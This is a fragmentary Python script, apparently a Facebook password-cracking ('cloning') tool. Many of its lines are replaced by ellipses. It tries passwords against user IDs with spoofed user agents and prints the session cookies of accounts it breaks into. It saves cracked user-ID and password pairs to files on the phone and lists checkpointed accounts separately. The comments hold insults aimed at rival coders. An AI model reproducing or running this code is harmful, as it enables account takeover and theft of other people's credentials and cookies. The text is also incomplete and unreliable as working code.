#DECODE BY METAR BABA Nehal-901
#METAR BABA BLADE & METAR AMMU MIA KHOLIFA
#NEXT TIME AR ABALMI KORTE ASIS NA ABAL 🖕
#NEXT TIME NEHAL AR SAHTA ABLAMI KORTA ASBI NA OK
...
logo =("""\033[0;92m
 .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |  _______     | || |      __      | || |  ___  ____   | || |     _____    | || |   ______     | |
| | |_   __ \    | || |     /  \     | || | |_  ||_  _|  | || |    |_   _|   | || |  |_   _ \    | |
| |   | |__) |   | || |    / /\ \    | || |   | |_/ /    | || |      | |     | || |    | |_) |   | |
| |   |  __ /    | || |   / ____ \   | || |   |  __'.    | || |      | |     | || |    |  __'.   | |
...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=_qWaZKHjc2LJswwbNzw7d8Va; sb=_qWaZLzcpfuTedCTrkcJFirz; m_pixel_ratio=2.34375; wd=461x879; fr=0yqrtpttBaifbrcT5..BkmqX-.5A.AAA.0.0.Bkmvd6.AWUOzY3EXEc',
    ...
    'user-agent': pro,}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[RAKIN-KING-OK💚] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/RAKIB-KING-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[RAKIB-KING-CP] ' +uid+ ' • ' +ps+           '  \33[0;97m')
                open('/sdcard/RAKIB-KING.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}RAKIB-KING{x}][%s\%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
 
xxr()
#META AR ABBU RAKIB GIFT DISA VLO KORA EDIT KORA US KORO 
# aska tahka RAKIB tur abbu 